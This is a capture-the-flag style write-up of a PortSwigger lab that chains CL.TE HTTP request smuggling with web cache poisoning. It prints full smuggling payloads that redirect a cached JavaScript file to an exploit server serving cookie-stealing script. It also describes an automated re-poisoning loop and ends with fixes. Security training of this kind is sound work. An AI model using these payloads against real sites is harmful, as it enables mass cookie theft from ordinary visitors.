# Exploiting HTTP request smuggling to perform web cache poisoning

**Category:** HTTP Request Smuggling
**Difficulty:** EXPERT
**Lab:** https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning

Every exploit so far in this series has targeted a single connection, one victim at a time. Chaining request smuggling into a cache poisoning attack changes the blast radius entirely — instead of waiting for one specific user's request to land on a poisoned connection, we corrupt a cached response that gets served to *every* visitor who requests that resource until the cache entry expires or gets overwritten again.

## The Target

The blog has a "Next post" navigation feature that issues a redirect built from the request's `Host` header, and a cacheable JavaScript file at `/resources/js/tracking.js` served with `Cache-Control: max-age=30`. Individually, neither of those is unusual — a Host-header-driven redirect and a cached static asset are both common patterns. Combined with a request smuggling primitive, they become a way to make the cache itself serve malicious content.

## The Investigation

The redirect endpoint is the gadget: a request to `/post/next?postId=3` returns a redirect whose `Location` is built from the request's own `Host` header rather than a hardcoded value. If we could get the front-end to cache *that* redirect response under the URL of the cacheable JS file, every subsequent visitor requesting the JS file would instead receive a redirect to a host of our choosing.

The mechanism for making that happen is a CL.TE smuggle where the smuggled request is a complete, standalone `GET /post/next?postId=3` with a forged `Host` header pointing at our exploit server. Because the smuggled request sits queued in the back-end's response pipe, the front-end's cache can end up associating that response with whatever URL the front-end's caching logic matches it against next — in this case, the JS file's URL, if the timing lines up. One detail mattered more than expected: the smuggled request needed an *oversized* `Content-Length` relative to its actual body — `Content-Length: 10` with a body of only `x=1` (3 bytes) — so the back-end absorbs 7 extra bytes from whatever request follows it on the connection. Without that padding, the desync timing didn't line up reliably enough for the poisoned response to land where we needed it.

## The Exploit

First, we set up an exploit server page serving `alert(document.cookie)` as JavaScript, then smuggled the redirect request with `Host` pointed at that exploit server:

```
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: <calculated>
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: EXPLOIT_SERVER
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```

Poisoning the cache wasn't a single-shot operation — the front-end has to happen to route the follow-up request for `tracking.js` to the same back-end connection that has the queued redirect response, which is a probabilistic race. Our lab code fired rapid POST (smuggle) + GET (`/resources/js/tracking.js`) pairs in a loop, checking after each pair whether the JS file's response had turned into a redirect to our exploit server. In our run it took roughly 34 such pairs before the cache flipped. Once poisoned, we kept re-poisoning at intervals shorter than the cache's `max-age=30` window to keep the malicious redirect alive until the lab's simulated victim loaded the page and executed our JavaScript.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's solution builds the same redirect-poisoning chain, in the same order — confirm the Host-driven redirect, stand up the exploit server payload, then poison and verify:

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 193
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```

followed by fetching `/resources/js/tracking.js` and confirming the response is now a redirect. This is the same mechanism and nearly the same payload we used — the `Content-Length: 10` / `x=1` oversizing pattern appears in both independently, which suggests it's less a stylistic choice and more a genuine requirement of how this particular desync needs to be timed. Their solution notes "you may need to repeat the POST/GET process several times before the attack succeeds," matching our own ~34-attempt experience. The delivery gap here is larger than in earlier labs: PortSwigger's walkthrough is a manual repeat-and-check loop in Burp Repeater, while ours was a genuinely automated loop firing dozens of request pairs and checking cache state programmatically — the kind of sustained, high-volume repetition that's far more practical to script than to click through by hand.

## What This Teaches Us

Chaining request smuggling with cache poisoning converts a per-connection attack into a persistent, cache-wide one — the poisoned response keeps getting served to new visitors with zero further action from the attacker until the TTL expires or the cache gets overwritten by a legitimate response. It's also a good example of how far a single primitive (the ability to smuggle a complete standalone request) travels once it's combined with an otherwise-unremarkable feature like a Host-header-driven redirect on a cacheable path. The fix here is layered: eliminate the request smuggling vector at the transport level, but also treat a redirect's `Location` header as untrusted input the moment it's derived from anything client-controlled, since a Host-driven redirect is a cache poisoning gadget with or without smuggling in the picture.
